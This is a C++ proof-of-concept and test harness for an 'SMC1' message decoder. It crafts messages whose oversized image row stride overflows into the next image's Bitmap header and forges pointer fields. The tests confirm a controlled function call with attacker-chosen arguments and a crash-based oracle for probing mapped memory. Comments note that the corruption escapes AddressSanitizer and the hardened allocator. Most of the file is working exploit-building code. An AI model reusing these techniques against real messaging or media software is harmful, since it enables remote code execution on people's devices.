// host_message.cpp — off-device PoC / unit harness for the SMC1 decoder.
//
//   g++ -std=c++17 -fsanitize=address,undefined -I.. ../message.cpp tools/host_message.cpp -o /tmp/hm && /tmp/hm
//
// Covers: benign multi-part decode (ASan/UBSan clean); malformed rejection; and
// THE BUG end-to-end — image[0]'s oversized row stride overruns its pixel buffer
// onto image[1]'s adjacent Bitmap header, letting attacker bytes forge that
// surface, which then yields the two primitives from its real fields:
//   * the teardown `release(pixels, context)` callback  -> a CONTROLLED CALL
//   * the render read-loop on `pixels/row_bytes/height`  -> the 1-bit oracle
//     (mapped probe completes; unmapped probe crashes the process = silence)
//
// The overflow is intra-arena (one operator new), so ASan does NOT flag it — by
// design: a logic corruption invisible to standard heap-overflow detection and
// off Scudo. The unmapped-probe test forks and crashes on purpose; ASan turns its
// SIGSEGV into SIGABRT, which the harness still counts as "crashed".
#include "../message.hpp"

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

#include <sys/wait.h>
#include <unistd.h>

using namespace sasmedia;

namespace {

// ---- tiny SMC1 builder -----------------------------------------------------
struct Buf {
    std::vector<std::uint8_t> b;
    void u8(std::uint32_t v) { b.push_back(static_cast<std::uint8_t>(v & 0xff)); }
    void u16(std::uint32_t v) { u8(v); u8(v >> 8); }
    void u32(std::uint32_t v) { u16(v); u16(v >> 16); }
    void bytes(const void* p, std::size_t n) {
        const auto* q = static_cast<const std::uint8_t*>(p);
        b.insert(b.end(), q, q + n);
    }
};

void hdr(Buf& m, std::uint16_t parts) {
    m.bytes("SMC1", 4); m.u8(1); m.u8(0); m.u16(parts);
}

// Lay the 40-byte Bitmap fields the renderer reads.
void forge(std::uint8_t f[40], std::uint32_t w, std::uint32_t h, std::uint32_t rowBytes,
           std::uint32_t storage, std::uint64_t pixels, std::uint64_t release,
           std::uint64_t context) {
    std::memset(f, 0, 40);
    std::memcpy(f + 0, &w, 4);  std::memcpy(f + 4, &h, 4);
    std::memcpy(f + 8, &rowBytes, 4); std::memcpy(f + 12, &storage, 4);
    std::memcpy(f + 16, &pixels, 8); std::memcpy(f + 24, &release, 8);
    std::memcpy(f + 32, &context, 8);
}

// A 2-image message whose image[0] (width=10 -> visible row 40, height=2,
// stride=80) overruns its pixel buffer so the last source row (data[80..120])
// lands on image[1]'s Bitmap header, overwriting it with `forged`.
std::vector<std::uint8_t> overflow_message(const std::uint8_t forged[40]) {
    std::vector<std::uint8_t> d0(120, 0xAA);
    std::memcpy(d0.data() + 80, forged, 40);
    Buf m; hdr(m, 2);
    m.u8(2); m.u16(10); m.u16(2); m.u32(80); m.u32(120); m.bytes(d0.data(), 120);  // image[0]
    const std::uint8_t z[4] = {0};
    m.u8(2); m.u16(1); m.u16(1); m.u32(4); m.u32(4); m.bytes(z, 4);                 // image[1]
    return m.b;
}

// ---- test scaffolding ------------------------------------------------------
int g_pass = 0, g_fail = 0;
void ok(const char* name, bool cond) {
    std::printf("[%s] %s\n", cond ? "PASS" : "FAIL", name);
    cond ? ++g_pass : ++g_fail;
}

// Controlled-call observers.
int g_called = 0;
void* g_arg0 = nullptr;
std::uintptr_t g_arg1 = 0;
void marker(void* a, void* c) { ++g_called; g_arg0 = a; g_arg1 = reinterpret_cast<std::uintptr_t>(c); }
std::uint8_t g_dummy[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};

}  // namespace

int main() {
    // 1. benign multi-part decode: text + image(2x2 tight) + sticker.
    {
        Buf m; hdr(m, 3);
        m.u8(1); m.u32(2); m.bytes("hi", 2);                                  // text
        m.u8(2); m.u16(2); m.u16(2); m.u32(8); m.u32(16);                     // image 2x2, tight
        for (int i = 0; i < 16; ++i) m.u8(static_cast<std::uint8_t>(i * 16));
        m.u8(3); m.u16(1); m.u16(2); m.u32(0xFF112233); m.u32(0xFF445566);    // sticker
        RenderedMessage out;
        ok("benign multi-part decodes",
           compose_message(m.b.data(), m.b.size(), out) && out.parts.size() == 3 &&
           out.parts[0].kind == PartKind::Text && out.parts[0].text == "hi" &&
           out.parts[1].kind == PartKind::Image && out.parts[1].pixels.size() == 4 &&
           out.parts[2].kind == PartKind::Sticker && out.parts[2].sticker_id == 1 &&
           out.parts[2].palette.size() == 2);
    }

    // 2. malformed rejection (no crash).
    {
        RenderedMessage out;
        std::uint8_t bad[8] = {'X', 'M', 'C', '1', 1, 0, 1, 0};
        ok("bad magic rejected", !compose_message(bad, sizeof bad, out));
        ok("truncated rejected", !compose_message(bad, 5, out));
        std::uint8_t unk[] = {'S', 'M', 'C', '1', 1, 0, 1, 0, 99 /*kind*/};
        ok("unknown part rejected", !compose_message(unk, sizeof unk, out));
    }

    // 3. THE BUG: stride overflow -> Bitmap[i+1] confusion -> controlled call.
    {
        std::uint8_t f[40];
        forge(f, /*w*/ 1, /*h*/ 1, /*rowBytes*/ 4, /*storage*/ 1 /*External*/,
              reinterpret_cast<std::uintptr_t>(g_dummy),     // pixels (release arg0)
              reinterpret_cast<std::uintptr_t>(&marker),     // release (rip)
              0xCAFEBABEull);                                // context (arg1)
        g_called = 0;
        auto msg = overflow_message(f);
        RenderedMessage out;
        const bool decoded = compose_message(msg.data(), msg.size(), out);
        ok("overflow -> controlled release(arg0, arg1) call",
           decoded && g_called == 1 && g_arg0 == static_cast<void*>(g_dummy) &&
           g_arg1 == 0xCAFEBABEull);
    }

    // 4a. oracle: a mapped probe address is read and survives (no call).
    {
        std::uint8_t f[40];
        forge(f, 1, 1, 4, /*storage*/ 0 /*Arena, no release*/,
              reinterpret_cast<std::uintptr_t>(g_dummy), 0, 0);
        g_called = 0;
        auto msg = overflow_message(f);
        RenderedMessage out;
        ok("oracle: mapped probe survives",
           compose_message(msg.data(), msg.size(), out) && g_called == 0);
    }

    // 4b. oracle: an unmapped probe crashes the process (the "silence" signal).
    {
        std::uint8_t f[40];
        forge(f, 1, 1, 4, 0, 0x4141410000ull /*unmapped*/, 0, 0);
        auto msg = overflow_message(f);
        pid_t pid = fork();
        if (pid == 0) { RenderedMessage o; compose_message(msg.data(), msg.size(), o); _exit(0); }
        int st = 0; waitpid(pid, &st, 0);
        // "crashed" = the child did not exit cleanly: a true SIGSEGV (plain) or a
        // non-zero exit (ASan converts the SEGV into _exit!=0). A survivor _exit(0)s.
        const bool crashed = !(WIFEXITED(st) && WEXITSTATUS(st) == 0);
        ok("oracle: unmapped probe crashes", crashed);
    }

    std::printf("\n%d passed, %d failed\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
